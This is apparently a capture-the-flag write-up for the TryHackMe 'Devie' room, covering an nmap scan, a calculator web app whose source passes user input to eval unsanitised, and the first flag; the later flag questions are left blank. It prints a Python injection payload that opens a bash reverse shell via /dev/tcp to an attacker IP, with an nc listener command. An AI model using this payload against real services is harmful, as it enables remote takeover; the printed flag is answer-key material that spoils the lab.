# Devie

A developer has asked you to do a vulnerability check on their system.

<p align="center">
  <img src={require("./assets/devie/devie.png").default} width="128" />
</p>

### Task 1 - What are the flags?

> What is the first flag?

THM{Car3ful_witH_3v@l}

> What is the second flag?

> What is the root flag?

### Writeup

It is possible to start by scanning the machine for open ports with nmap.

There are only the 22 port for SSH and 5000.

<p align="center">
  <img src={require("./assets/devie/nmap.png").default} />
</p>

By connecting to the port 5000 with the browser we can find a web application.
The website allows to do different math calculations.

<p align="center">
  <img src={require("./assets/devie/website.png").default} />
</p>

In the footer of the page is possible to download the source code.

By looking careful to the code we can see a vulnerability in the eval function with user input. There is no sanitation, it only checks that the values given are string.

<p align="center">
  <img src={require("./assets/devie/vuln.png").default} />
</p>

We can try to obtain a reverse shell by using a custom payload.

For example:

```py
__import__('os').system('bash -c \'bash -i >& /dev/tcp/10.10.142.179/1337 0>&1\'')#
```

Substitute the IP and the port.
On your machine run:

```sh
nc -nvlp 1337
```

<p align="center">
  <img src={require("./assets/devie/flag1.png").default} />
</p>
